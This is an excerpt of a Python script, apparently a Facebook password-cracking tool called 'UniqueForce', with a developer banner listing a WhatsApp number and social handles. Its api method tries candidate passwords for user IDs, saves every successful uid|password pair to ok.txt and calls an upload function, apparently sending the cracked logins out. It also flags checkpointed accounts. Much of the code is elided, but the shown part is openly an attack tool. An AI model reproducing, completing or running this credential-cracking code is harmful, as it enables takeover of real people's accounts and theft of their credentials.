...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +8801306674582")
	subprocess.check_output(["am", "start", "https://wa.me/+8801306674582"])
...
class Main:
	def __init__(self):
		...
		print ("""\033[0;+-+-+-+-+-+-+-+-+-+-+-+
|U|n|i|q|u|e|F|o|r|c|e|
+-+-+-+-+-+-+-+-+-+-+-+

                                   
 
 > \033[0;92mDEVELOPER     : MAJHARUL ISLAM TUTUL
 > \033[0;95mFACEBOOK ID   :  Majharul Islam Tutul
 HOSSEN
 > \033[0;41mWHATSAPP      : 01306674582
 \033[0;96m> YOUTUBE       : techtutul
 > \033[0;97mWARNING       :     Don't use it to hurt anyone
    """)
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [TUTUL-OK🥀] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[TUTUL-CP🥺] %s|%s\033[0;97m         "%(uid, pw))
